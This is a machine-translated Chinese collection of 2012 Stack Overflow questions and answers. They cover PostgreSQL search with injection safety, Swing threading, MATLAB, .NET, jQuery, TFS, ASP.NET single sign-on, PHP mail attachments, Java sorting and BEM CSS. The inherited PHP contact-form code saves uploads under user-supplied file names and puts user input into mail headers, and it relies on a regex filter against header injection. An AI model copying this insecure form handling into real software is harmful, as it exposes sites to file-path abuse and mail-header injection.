3.  我们还支持非 posix 和 OS X 系统，以及与文件系统相关的小问题（字符集/编码、分隔符、路径深度等）和 *nix 上不区分大小写的文件系统引起了很多麻烦。基于 CHM 的帮助解决了这个问题，允许一组例程访问所有系统上的帮助数据。
4.  indexing 和 toc 是基于 Btree 的，并且可以从独立生成的帮助集中轻松合并运行时。一般来说，集成独立生成的帮助文件是帮助文件的一个被低估的方面，但它是开放平台的关键。
5.  本机全文搜索。

自己的查看器还可以利用基本系统之上的额外功能。

我没有提到 Lazarus 系统，希望你能适应它，因为它目前过于面向开发系统 (SDK) 的系统，查看器甚至不能作为单独的包提供。主要是为了说明html松散的问题。

不过，我有一段时间没有调查 KDE/Gnome/Eclipse 它们用作帮助系统的内容。如果我必须从头开始，那就是我首先要看的地方。

如果我必须自己快速创建一些东西，我会使用压缩的静态 html，以及一个带有元数据/索引的 gzip 文件和我能找到的最轻的浏览器（Konquerer？）。不理想，不像 Windows，但显然是 Linux 可以提供的最好的。

# postgresql - 如何在不允许正则表达式注入的情况下在 sql 中使用文本搜索和参数化查询

> ID：14074327
> 
> 赞同：1
> 
> 时间：2012-12-28T18:55:06.643
> 
> 标签：postgresql, pdo, sql-injection, sql-like

所以我试图围绕如何安全地组合三个冲突的东西（绑定参数、正则表达式、使用用户输入的部分匹配搜索）来解决问题，我不确定我是否找到了正确/安全的方法来处理这些事物。这不应该是一个不常见的问题，但是处理 PDO 和 php 的所有三个安全因素的交集的文档要么很难找到，要么不存在。

我的需求比较简单和标准，按优先级排列：

1.  我想防止sql注入（目前我正在使用绑定参数）
2.  我想防止正则表达式注入
3.  我想使用用户输入字符串进行部分匹配搜索

因此，例如，我想允许用户搜索不区分大小写的部分匹配的用户名，例如搜索`Xiu`将显示用户名`Xiu`，`Xiulu`并且`xiuislowercase`

目前我有以下声明：

```
select * from users where username ilike :search_string || '%' 
```

在其他地方，我使用正则表达式运算符使用更复杂的情况，类似于：

```
select * from users where username ~* :search_string || '%' 
```

php pdo中的绑定语句在哪里`:search_string`，数据库是postgresql。这执行了正确的搜索，返回了正确的结果，并且我有理由确定它是针对 sql 注入的证明，因为它是一个绑定参数。但是，我不确定它是否可以防止正则表达式注入，并且我不知道如何在证明它可以防止 sql-injection 的同时证明它可以防止正则表达式注入。
我如何使用 php、PDO 和 postgresql 完全保护它免受正则表达式注入？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:18:31.427

`LIKE`不支持正则表达式，它只有有限的模式匹配元字符`%`和`_`. 因此，如果您在将参数值传递给字符串之前使用字符串中的反斜杠转义这两个字符，那么您应该是安全的。

```
<?php
$search_string = preg_replace('/[%_]/', '\\\\$0', $search_string);
$pdoStmt->execute(array('search_string'=>$search_string)); 
```

或者，您可以将用户名的左子字符串与您的输入进行比较，然后将其与没有元字符模式匹配功能的固定字符串进行比较。

```
select * from users where left(username, :search_string_length) = :search_string 
```

* * *

回复您的评论：

避免代码注入的一般规则是：**永远不要将任意用户输入作为代码执行。**

这当然适用于 SQL 注入，这就是为什么我们使用参数来强制用户输入被解释为值，而不是修改 SQL 语句的语法。

但它也适用于 SQL 操作中正则表达式字符串中的“代码”。正则表达式本身就是一种代码逻辑，它是用于匹配输入的[有限状态机的非常紧凑的表示。](http://en.wikipedia.org/wiki/Finite-state_machine)

避免代码注入的解决方案是可以让用户输入*选择*代码（如白名单），但不要让用户输入被解释*为*代码。

# java - 对单个线程使用 sleep()

> ID：14074329
> 
> 赞同：4
> 
> 时间：2012-12-28T18:55:26.990
> 
> 标签：java, multithreading, swing, event-dispatch-thread, thread-sleep

我对 java 还很陌生，并且开始使用不同的线程来使用`wait()`或`sleep()`在我的代码的一部分上使用，并让其他的仍然运行。

对于这个项目，我使用`JFrame`的是`javax.swing.*`和`java.awt.*`导入。我想要做的是让其中一个线程（在我的代码中它是主要的起始线程）允许玩家在井字游戏板上选择一个空间，当他们点击它时，它会改变图标，并且然后 AI 将等待 1 秒钟，然后从我创建的第二个线程播放。

不幸的是，每当我调用`ait.sleep(1000)`（`ait`是我的线程名称）时，两个线程都会等待 1 秒才能完成它们的执行。谁能告诉我为什么休眠一个线程会停止我的整个执行？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-28T19:04:48.617

> 谁能告诉我为什么休眠一个线程会停止我的整个执行

为了更好地解释您的 Swing GUI 是在其自己的*特殊线程*上创建的，与其他代码将在其中运行的线程分开`main()`，这是通过在`SwingUtilities.invokeXXX`块中创建您的 Swing 组件来完成的（即使您没有这样做，您的 GUI 也将在单线程称为[初始线程](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/initial.html)）。现在，如果您只是简单地调用`sleep`while on `Event Dispatch Thread`（或就此而言`Thread`），它将等待调用`Thread.sleep`完成。现在因为所有 Swing 事件都在 EDT 上处理，我们通过调用暂停它的执行，`sleep(..)`从而暂停 UI 事件的处理，因此 GUI 被冻结（直到`sleep(..)`返回）。

你不应该使用`Thread.sleep(..)`on [`Event Dispatch Thread`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)（或者任何`Thread`sleep 会导致不必要的执行阻塞的地方），因为这会导致 UI 看起来冻结。

[这](http://foxtrot.sourceforge.net/docs/freeze.php)`Thread.sleep(..)`是一个很好的示例，它准确地演示了调用GUI 的 EDT引起的这种不需要的行为。

而是使用：

*   例如[摇摆定时器：](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)

    ```
    int delay=1000;// wait for second

    Timer timer = new Timer(delay, new AbstractAction() {
        @Override
        public void actionPerformed(ActionEvent ae) {
            //action that you want performed 
        }
    });
    //timer.setRepeats(false);//the timer should only go off once
    timer.start(); 
    ```

*   [摇摆工人](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/worker.html)

或者如果没有创建/修改 Swing 组件：

*   [定时器任务](http://docs.oracle.com/javase/7/docs/api/java/util/TimerTask.html)

*   [Thread](http://docs.oracle.com/javase/tutorial/essential/concurrency/runthread.html)，然后您将使用`Thread.sleep(int milis)`（但在任何情况下，这都是 IMO 的最后一个选项）

**更新**

`Swing Timer`/`SwingWorker`仅在 Java 1.6 中添加，`TimerTask`并且`Thread`在 Java 1.3 和 JDK 1 中已经存在了更长的时间，因此您甚至可以使用上述两种方法中的任何一种，并将创建/操作 Swing 组件的调用包装成`SwingUtilities/EventQueue#invokeXX`块；这就是过去做事的方式：P

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T19:28:01.980

[`Thread.sleep`](http://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#sleep%28long%29)是一种静态方法。通过任何给定的引用来调用它`Thread`只是一种方便的形式。

结果，任何对的调用`sleep`实际上都是`sleep`在调用 current `Thread`，我怀疑在您的情况下这是事件线程。在事件线程上休眠/阻塞将给出被锁定的外观。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-28T19:04:14.733

如果您希望线程休眠，则*将该线程*`ait`编码为休眠。一个线程“进入”另一个线程并在低级别推动它的设计从根本上被破坏了。您为每个线程编写代码，因此首先编写它以执行您希望它执行的操作，这样您就无需从外部进入它。

 *哪个更有意义，是让厨房里的人知道如何做早餐，还是让卧室里的人大喊大叫并指导他们执行做早餐的每一步？当然，你可以告诉他们做早餐。但你*绝对*不会把每一步都导向低水平。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T19:29:59.927

`Thread.sleep`是一种*静态*方法，它使当前正在执行的线程休眠指定的时间。Java 语法允许您通过变量调用静态方法，但编译器只是使用该变量的编译时类型来确定调用哪个方法，即

```
Thread ait = null;
ait.sleep(1000); // calls Thread.sleep(1000), causing current thread to sleep.
                 // In particular, does *not* NPE 
```

您还提到`wait()`- 虽然这是一个实例方法而不是静态方法，但它仍然会导致*当前线程*进行等待（`ait.wait(1000)`将导致当前线程等待长达 1 秒或直到另一个线程调用`ait.notifyAll()`）。

在Java 的早期引入了一个`Thread.suspend()`和它的对应物，以允许一个线程控制另一个线程，但它们很快就被弃用了，因为它们天生容易死锁。`resume()`如果您希望一个线程“控制”另一个线程，推荐的模式是合作进行，即拥有线程 A 设置和线程 B 读取的某种共享标志，并让 B根据标志让*自己进入睡眠状态：*

```
volatile boolean threadBShouldRun = true;

// Thread B
while(true) {
  if(threadBShouldRun) {
    // do some stuff
  } else {
    Thread.sleep(1000);
  }
}

// Thread A
if(someCondition) {
  threadBShouldRun = false;
} 
```

但是使用包中存在的工具通常更容易且不易出错`java.util.concurrent`。正确地做多线程比表面上看起来要困难得多。*

# function - 'cell' 类型的输入参数的未定义函数 'times'

> ID：14074333
> 
> 赞同：0
> 
> 时间：2012-12-28T18:56:16.660
> 
> 标签：function, matlab, undefined, cell

我正在使用 matlab 绘制此代码，该代码应绘制 Theta （不同时间的无量纲温度（t）），当我尝试运行它时，我收到此错误“未定义函数 'times' for input arguments of type 'cell'”

```
t=1:1:5;
alfa=(1.172.*(10.^(-2))); ......   
    % alfa for steel with 1% carbon = 1.172*10^-2 m^2/s%
L=1;
T={(alfa.*t)./(L.^2)}; % dimensionless time equation %
lambda1=0.3111; % @ biot =0.1 % 
A1=1.0161; % @ biot =0.1 %
theta={A1.*exp(-(lambda1.^2).*T)}; % dimensionless Temperature equation %
plot(t,theta,'.'); 
```

一般来说，我仍然是 matlab 和编程的初学者。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:27:22.720

出于某种原因，您在第 5 行和第 8 行（花括号`{}`）使用了元胞数组。只需删除它们，您的代码就会绘制...

问候

# .net - 尝试从 Framework 4.0 更改为 3.5 .NET 时出现问题

> ID：14074336
> 
> 赞同：0
> 
> 时间：2012-12-28T18:56:32.993
> 
> 标签：.net, c#-4.0, frameworks, windows-forms-designer, downgrade

我有一个项目完成。NET Framework 4，我需要添加一些适用于 Framework 3.5 的库，所以我将项目更改为 Framework 3.5，现在项目可以识别这些库，但它显示类似于以下的错误：

**错误 2 对象引用未设置为对象的实例。**

这是在每个。resx 我的项目中有，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:09:18.780

似乎这对你有用......

> 1.  在 Designer 中打开 Form 并进行必要的 GUI 更改。关闭设计器并保存
> 2.  编译项目并收到 RESX 编译错误（只有带有 Imagelist 的表单应该有这个问题）
> 3.  双击 resx compile error 打开 resx 文件。
> 4.  滚动到图像流的顶部。
> 5.  编辑图像流的第一行：AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4w TO AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj0yLjAuMC4w
> 6.  关闭并保存 resx 文件并重新编译。
> 
> **注意：唯一的区别是末尾的字符“j00LjAuMC4w”到“j0yLjAuMC4w”

从[Microsoft Connect](http://connect.microsoft.com/VisualStudio/feedback/details/532584/error-when-compiling-resx-file-seems-related-to-beta2-bug-5252020)网站获得此解决方案。感谢他们。

# jquery - jQuery爆炸动画不起作用

> ID：14074338
> 
> 赞同：1
> 
> 时间：2012-12-28T18:56:50.313
> 
> 标签：jquery, html, jquery-animate

使用下面的代码唯一发生的事情是图像消失了，根本没有动画。有什么提示吗？

```
var img1 = $('<img src="image' + num + '.jpg" />').css({"position": "absolute"});
var div = $('<div id="wtf">').css({
        "position": "absolute",                    
        "left": targetX-80,
        "top": targetY-112.5
    });

    setTimeout(function() {div.append(img1).hide().fadeIn(400);}, 500);

    setTimeout(function() {div.append(img1).hide("explode", { pieces: 16 }, 400);}, 800); //not working

    $(document.body).append(div); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:08:46.660

因为图像绝对定位在 div 内，所以 div 没有高度，所以动画运行但没有真正的效果。为 div 添加一个高度，您将看到动画。

```
var div = $('<div id="wtf">').css({
    "position": "absolute",     
    "height": 100,               
    "left": targetX-80,
    "top": targetY-112.5
}); 
```

演示：http: [//jsfiddle.net/Cm5qD/](http://jsfiddle.net/Cm5qD/)

（作为旁注，没有理由在第二个中重新附加图像`setTimeout()`。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:08:06.943

基础 jQuery 不包含`.hide()`可以将“爆炸”作为第一个参数的 a。

如果您使用的是 jQueryUI 库，则需要包含它。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-12-28T19:18:10.273

这就是您希望在淡入淡出的回调中调用爆炸的内容。您还需要找到图像而不是再次附加它。 [http://jsfiddle.net/jxZAW/](http://jsfiddle.net/jxZAW/)

```
var img1 = $('<img src="http://placekitten.com/200/200" />').css({"position": "absolute"});
var div = $('<div id="wtf">').css({
        "position": "absolute",                    
        "left": 200,
        "top": 200
    });

    div.append(img1).hide().fadeIn(400,function(){
        div.find('img').hide('explode', { "pieces":16 }, 600, function() { $(this).remove; });
    });

   $(document.body).append(div); 
```

# tfs - 像 TFS 门户网站一样退出网站

> ID：14074345
> 
> 赞同：0
> 
> 时间：2012-12-28T18:57:08.533
> 
> 标签：tfs, teamcity, tfs-sdk, tfs-workitem

我正在尝试编写一个连接到 TFS 并检索工作项信息的网站

```
NetworkCredential cred = new NetworkCredential("Username", "Password", "Domain");
tfs = new TeamFoundationServer("http://tfs:8080/tfs", cred);
tfs.EnsureAuthenticated(); 
```

当我通过这种方式登录时，我想像 TFS 的门户网站一样退出。你可以帮帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-30T00:07:44.767

您可能应该改用带有 kerberos 委派的 windows auth。

这意味着用户不需要输入他们的用户名/密码，因为他们已经通过登录域进行了身份验证，并且不需要退出功能。

有关更多详细信息，请参阅[使用 ASP.NET 和 TFS api 的直通（模拟）身份验证](https://stackoverflow.com/questions/4013081/passthrough-impersonation-authentication-with-asp-net-and-tfs-api)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T12:52:16.807

你应该使用 TFS APi 的 . 要获取工作项字段，您必须选择 wistore。你可以在上面查看“shai raiton”文章。谷歌它作为shai raiton tfs。我记得他制作了一个工具，他可以从中获取所有工作项（批量删除它们）。搜索它你肯定能找到答案！如果有帮助，请投票！

# asp.net - asp.net 3.5 c#中的单点登录

> ID：14074356
> 
> 赞同：0
> 
> 时间：2012-12-28T18:58:05.307
> 
> 标签：asp.net, forms, authentication, implementation, single-sign-on

在默认网站中，我有 2 个 asp.net Web 应用程序 App1 和 App2。当用户登录时，用户名和密码在 sql 数据库的用户表中验证时具有相同的登录控制。登录的用户信息存储在 3 个会话变量中。登录后 app1 重定向到 profile.aspx，app2 重定向到 dashboard.aspx。profile.aspx 有一个链接 app2，dashboard.aspx 有一个链接 app1。如果用户单击该链接，他应该已经登录了该应用程序。如果用户从任何一个应用程序注销，他应该同时注销这两个应用程序。

如何在我的 App1 和 App2 中添加上述 sso 功能

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:14:45.113

应用程序将在同一个域中吗？如果是，那么您需要做的就是将 App 2 的表单身份验证设置为 App 1 或其他方式，并确保为两个应用程序指定相同的机器密钥。本文对如何在子域中实现 SSO 进行了更多说明：http: [//www.codeproject.com/Articles/27576/Single-Sign-on-in-ASP-NET-and-Other-Platforms](http://www.codeproject.com/Articles/27576/Single-Sign-on-in-ASP-NET-and-Other-Platforms)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:01:48.063

我建议你看看[Windows Identity Foundation](http://msdn.microsoft.com/en-us/security/aa570351.aspx)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T20:29:18.437

我假设您的应用程序中使用了表单身份验证。Forms 身份验证生成身份验证票以验证随后的用户请求，并使用“机器密钥”对身份验证票进行签名。通过为所有应用程序使用相同的机器密钥将解决该问题。但是，根据需要集成的应用程序的范围，需要考虑不同的场景。

1.  配置为同一域内的虚拟目录
2.  配置为子域
3.  完全两个不同的网站

1 和 2 可以通过在 web.config 中指定相同的机器密钥来解决。

3 需要自定义解决方案，例如通过查询字符串传递加密参数。

有关机器密钥的更多信息，请参见[此处](http://msdn.microsoft.com/en-us/library/ff649308.aspx)。

# jquery - Richfaces 文件上传制表位

> ID：14074358
> 
> 赞同：1
> 
> 时间：2012-12-28T18:58:14.043
> 
> 标签：jquery, richfaces

我们需要使我们的应用程序键盘可访问。但对于 RF 文件上传组件，我无法将焦点设置在“上传”按钮上。（它只在隐藏添加按钮后显示）我正在考虑使用 JQuery，但我无法在“添加”之后和“上传”之前捕获事件。onadd 事件似乎以某种方式被删除。我们正在使用 RF 4.3、jsf 2.1。有人有什么想法吗？

# php - 使用 PHP 将文件附加到电子邮件

> ID：14074359
> 
> 赞同：4
> 
> 时间：2012-12-28T18:58:16.143
> 
> 标签：php, wamp

我有一个应该将文件附加到外发电子邮件的功能。由于某种原因，它只发送空白文件。

有人可以帮忙吗？我已验证文件本身已正确上传，并且位于此功能正常工作所需的确切位置。仅允许使用 .pdf、.doc 和 .docx

此外，这是在 Windows 服务器上......（我知道，我知道......太糟糕了！）

这是功能：

```
function mail_attachment($filename, $path, $mailto, $from_mail, $from_name, $replyto, $subject, $message) {
    $file = str_replace('/','\\',$path.$filename);
    $file_size = filesize($file);
    $handle = fopen($file, "rb");
    $contenta = fread($handle, $file_size);
    fclose($handle);
    $content = chunk_split(base64_encode($contenta));
    $uid = md5(uniqid(time()));
    $name = basename($file);
    $header = "From: ".$from_name." <".$from_mail.">\r\n";
    $header .= "Reply-To: ".$replyto."\r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
    $header .= "This is a multi-part message in MIME format.\r\n";
    $header .= "--".$uid."\r\n";
    $header .= "Content-type:text/plain; charset=iso-8859-1\r\n";
    $header .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $header .= $message."\r\n\r\n";
    $header .= "--".$uid."\r\n";
    $header .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n"; // use different content types here
    $header .= "Content-Transfer-Encoding: base64\r\n";
    $header .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
    $header .= $content."\r\n\r\n";
    $header .= "--".$uid."--";
    if (mail($mailto, $subject, "", $header)) {
        return true; // or use booleans here
    } else {
        return false;
    }
} 
```

这是使用它的代码：

```
//resume
$errors="";
$dbDir="/candidate-resources/files/temp/";
$baseDir=$_SERVER['DOCUMENT_ROOT'].$dbDir;
$validTypes=array(".doc",".pdf",".docx");
$filesToAdd=array();
$atLeastOne=false;
$valid=false;
$qs="";
if(count($_FILES)>0){
    foreach($_FILES as $k=>$v){
        if($v['size']>0){
            $ext=substr($v['name'],strrpos($v['name'],"."));
            if(!in_array($ext,$validTypes)){
                $errors='Only ".doc", ".docx", and ".pdf" files can be uploaded. "'.$ext.'" is not a valid file type.';
            }
        }
    }
}
$requireds=array("name","email","message");
foreach($_POST as $k=>$v){//check for injection and spammers
    if(preg_match("/(%0A|%0D|\\n+|\\r+)(content-type:|to:|cc:|bcc:)/i",$v) || strpos($v,"http://")!==false || strpos($v,"www.")!==false){
        $errors="HTML, website addresses, and scripting code are not allowed in any field.  Please check your entries and try again.";
    }
    $post[$k]=strip_tags(trim(htmlentities($v)));
}
unset($_POST);
foreach($requireds as $r){
    if(!strlen(trim($post[$r]))){
        $errors.="<li>".ucwords($r)."</li>";
    }
}
if(strlen(trim($errors))){
    $errors="These fields were left blank.  Please fix and resubmit.<ul>".$errors."</ul>";
}
else{
    if(ereg("([[:alnum:]\.\-]+)(\@[[:alnum:]\.\-]+\.+)",$post['email'])!=true){
        $errors="<p>You must enter a valid email address.</p>";
    }
    else{
        $filename = '';
        $ext = '';
        // upload the file, then attach it to the email, then delete it
        foreach($_FILES as $k=>$v){
            if($v['size']!=0){
                $atLeastOne=true;
                $ext=substr($v['name'],strrpos($v['name'],"."));                
                move_uploaded_file($v['tmp_name'], $baseDir . "/" . $v['name']);
                $filename = $v['name'];
            }
        }
        $to = 'avalid@emailaddress';
        $subject="Contact Form";
        $headers="From: ".$post["name"]." <".$post["email"].">\r\nReply-To: ".$post["email"]."\r\n";
        $message=$subject."\r\n=================================================\r\n\r\n";
        foreach($post as $k=>$v) {
            if(strlen(trim($v))){
                $message.=ucwords(str_replace("_"," ",$k)).": {$v}\r\n";
            }
        }
        if(strlen($filename) > 0) {
            mail_attachment($filename, $baseDir, $to, $post["email"], $post["name"], $post["email"], $subject, $message);
            //now delete the temp file
            if (file_exists(str_replace('/','\\',$baseDir.$filename))) { 
                unlink(str_replace('/','\\',$baseDir.$filename)); // delete it here only if it exists
            }
        }else{
            mail($to,$subject,$message,$headers);
        }
        $errors="true";
    }
} 
```

请原谅...我刚刚继承了此代码（即：#1 7 岁，#2 现在他们希望能够将文件附加到此电子邮件）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-28T19:00:39.853

开始使用[Swiftmailer](http://swiftmailer.org/)（[文档](http://swiftmailer.org/docs/introduction.html)）或[PhpMailer](http://phpmailer.worxware.com/)，你的生活会更轻松......

# Swiftmailer 示例：

```
require_once 'lib/swift_required.php';
$transport = Swift_MailTransport::newInstance();
$mailer = Swift_Mailer::newInstance($transport);
$message = Swift_Message::newInstance('Wonderful Subject')
    ->setFrom(array('john@doe.com' => 'John Doe'))
    ->setTo(array('receiver@domain.org', 'other@domain.org' => 'A name'))
    ->setBody('Here is the message itself')
    ->attach(Swift_Attachment::fromPath('my-document.pdf'));
$mailer->send($message); 
```

# PhpMailer 示例：

```
$mail             = new PHPMailer(); // defaults to using php "mail()"
$mail->SetFrom('name@yourdomain.com', 'First Last');
$mail->AddReplyTo("name@yourdomain.com","First Last");
$mail->AddAddress("whoto@otherdomain.com", "John Doe");
$mail->Subject    = "PHPMailer Test Subject via mail(), basic";
$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
$mail->MsgHTML($body);
$mail->AddAttachment("images/phpmailer.gif");      // attachment
$mail->AddAttachment("images/phpmailer_mini.gif"); // attachment
if(!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
} else {
    echo "Message sent!";
} 
```

我更喜欢 Swiftmailer，但你选择你最好的选择 ;-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:12:48.963

我改变了我的一些功能，这很有效：

```
function mail_attachment($from, $fromname, $to, $subj, $text, $filename){
    $f         = fopen($filename,"rb"); 
    $un        = strtoupper(uniqid(time())); 
    $head      = "From: $fromname <$from>\n"; 
    $head     .= "To: $to\n"; 
    $head     .= "Subject: $subj\n"; 
    $head     .= "X-Mailer: PHPMail Tool\n"; 
    $head     .= "Reply-To: $from\n"; 
    $head     .= "Mime-Version: 1.0\n"; 
    $head     .= "Content-Type:multipart/mixed;"; 
    $head     .= "boundary=\"----------".$un."\"\n\n"; 
    $zag       = "------------".$un."\nContent-Type:text/html;\n"; 
    $zag      .= "Content-Transfer-Encoding: 8bit\n\n$text\n\n"; 
    $zag      .= "------------".$un."\n"; 
    $zag      .= "Content-Type: application/octet-stream;"; 
    $zag      .= "name=\"".basename($filename)."\"\n"; 
    $zag      .= "Content-Transfer-Encoding:base64\n"; 
    $zag      .= "Content-Disposition:attachment;"; 
    $zag      .= "filename=\"".basename($filename)."\"\n\n"; 
    $zag      .= chunk_split(base64_encode(fread($f, filesize($filename))))."\n";
    return @mail("$to", "$subj", $zag, $head);
} 
```

（不需要第三方包括）

# ios - 我们可以通过代码在word文件中添加文本字段吗？

> ID：14074361
> 
> 赞同：1
> 
> 时间：2012-12-28T18:58:17.673
> 
> 标签：ios, iphone, ms-word

我想通过代码在word文件中添加文本字段..在iphone中可以吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:36:14.547

这是我能找到的最好的：[如何在 iOS 应用程序中创建 .doc 文件或文字处理器？](https://stackoverflow.com/questions/8835152/how-to-create-doc-file-or-word-processor-in-ios-application)

这不是最令人鼓舞的答案，但它是一个起点。

该库位于[http://libopc.codeplex.com/](http://libopc.codeplex.com/)

# java - 如何按降序对数组进行排序以及对数组进行排序有哪些不同的选项？

> ID：14074362
> 
> 赞同：0
> 
> 时间：2012-12-28T18:58:33.193
> 
> 标签：java, processing

我一直在尝试这样做一段时间，但我做不到。

如何将默认升序更改为降序？另外，还有其他简单的方法可以对数组进行排序吗？

```
HighScore[] highscorelist = new HighScore[10]; // An array of 10

void setup() {
  size(800, 600);

  // score.txt is:
  //10  -
  //0   -
  //0   -
  //3   b

  String rows[] = loadStrings("scores.txt");

  for (int i = 0; i < highscorelist.length; i ++ ) { // Initialize
    String[] pieces = split(rows[i], TAB);
    highscorelist[i] = new HighScore(parseInt(pieces[0]), pieces[1]);
  }
  Arrays.sort(highscorelist, new SortHighScore());
}

void draw() { 
  fill(0);
  textSize(18);
  text("High Scores", 360, 234);
  text("Name", 300, 260);
  text("Score", 460, 260);
  int x = 320;
  int y = 290;

  //Arrays.sort(highscorelist, new SortHighScore("score"));
  for (int i =0; i < 10; i++) {
    highscorelist[i].display(x, y, 150);
    y+=20;
  }
}

class HighScore {
  int score;
  String name;

  HighScore() {
  }

  HighScore(int tempscore, String tempname) {
    score = tempscore;
    name = tempname;
  }

  void display(int x, int y, int gapX) {
    text(score, x+gapX, y);
    text(name, x, y);
  }
}

class SortHighScore extends HighScore implements Comparator {

  SortHighScore() {
  }

  /*
    method which tells how to order the two elements in the array.
   it is invoked automatically when we call "Arrays.sort", and must be included in this class.
   */
  int compare(Object object1, Object object2) {

    // cast the objects to your specific object class to be sorted by
    HighScore row1 = (HighScore) object1;
    HighScore row2 = (HighScore) object2;

    // necessary to cast to Integer type when comparing ints
    Integer val1 = (Integer) row1.score;
    Integer val2 = (Integer) row2.score;

    // the "compareTo" method is part of the Comparable interface, and provides a means of fully ordering objects.
    return val1.compareTo(val2);
  }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T19:01:52.843

```
Arrays.sort(array,Collections.reverseOrder()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:02:17.463

由于您已经编写了比较器，请更改此行

```
return val1.compareTo(val2); 
```

至

```
return val2.compareTo(val1); 
```

得到一个降序排序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:03:50.680

使用[Arrays](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Arrays.html)类进行排序。它具有 inbuit 排序功能

# ios5 - 从 ARM 程序集生成控制流程图

> ID：14074365
> 
> 赞同：0
> 
> 时间：2012-12-28T18:58:46.503
> 
> 标签：ios5, assembly, arm, flowchart, ida

目前我在 IDA Pro 的帮助下从 iOS 5 App 中提取了一些 ARMv7 汇编代码，我想根据这些汇编代码生成一个控制流图。有没有人可以推荐该工具可以帮助我做到这一点？我对汇编知之甚少，但我可以学习基本的指令和概念来构建图形

不管怎么说，还是要谢谢你！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T16:47:59.463

IDA 在内部生成这些。切换到图表视图。

# css - 与 BEM 修饰符混淆

> ID：14074366
> 
> 赞同：12
> 
> 时间：2012-12-28T18:59:10.090
> 
> 标签：css, bem

在编写 CSS 时，我已经开始使用[BEM 方法论](http://www.vanseodesign.com/css/block-element-modifier/)，并且在少数情况下我很难找到做某件事的最佳方法。

我想在这里举一个简单的面板示例。

假设我正在使用 BEM 样式编写面板组件 CSS。所以我的 CSS 可能如下所示：

```
.panel {}

.panel__titlebar {}

.panel__content { display: none; } 
```

面板可以是无镀铬的或镀铬的。所以我为面板定义了另一个修饰符类：

```
.panel--with-chrome {
 border: 4px solid black;
 border-radius: 4px;
} 
```

现在可以说，面板可以处于全屏/最大化状态，其中 chrome 和标题栏也会消失。不要为面板和标题栏定义修饰符，明智的做法是在父级（例如面板--全屏）上定义修饰符，其余元素应相应更改。所以现在我的 CSS 变成了：

```
.panel--fullscreen {
 /* something has to be done here */
}

.panel--fullscreen .panel__titlebar { display: none; } 
```

要在全屏模式下删除 chrome，我可以：

1.  在 JS 中切换**panel--with-chrome类和****panel--fullscreen**类

2.  覆盖**面板内的 chrome CSS——全屏**类。

首先不好，因为理想情况下我只想在 JS 中切换一个类（**.panel--fullscreen**）来切换全屏模式。

第二个不好，因为我必须覆盖以前的 CSS，这是一种不好的做法。

那么最好的方法是什么？感谢您的评论。

谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-01T10:57:39.617

答案取决于很多事情。

首先，有多少逻辑和外观有“panel--with-chrome”和“panel--fullscreen”修饰符。还有这个逻辑是什么类型的。

如果“panel--with-chrome”带来了很多 CSS 属性和特殊的 JS 功能，我会在应用“panel--fullscreen”时在 JavaScript 中切换它。
它还取决于您使用的 JavaScript 框架。在我们在 Yandex 使用的“i-bem.js”中，很容易对附加修饰符做出反应：

*   [单击后，正方形会更改大小修饰符](http://bem.github.com/bem-bl/sets/common-desktop/i-bem/examples/17-i-bem_square.html)
*   [对应用修改器做出反应](https://github.com/bem/bem-bl/blob/gh-pages/blocks-desktop/i-bem/examples/17-i-bem_square.blocks/b-square/b-square.js#L8)

但是，如果您使用的框架不允许方便地表达这种反应，那么这个答案对您来说就不会那么好。

在另一种情况下，当“panel--with-chrome”没有太多属性并且没有为页面带来任何 JavaScript 逻辑时，我会在“panel--fullscreen”类中重新定义这些 CSS 属性。

综上所述，没有通用的解决方案和严格的规则可循。您应该自己决定什么对您的情况有用。这个决定应该取决于很多事情：

*   如果您希望将来维护您的项目，哪种解决方案更容易支持？
*   您使用的 JavaScript 框架的功能
*   性能的东西
    不是在这种特殊情况下，但有时我们会测量我们选择的变体的渲染速度。
*   其他人的意见，如果你在团队中工作
*   您项目的文件结构
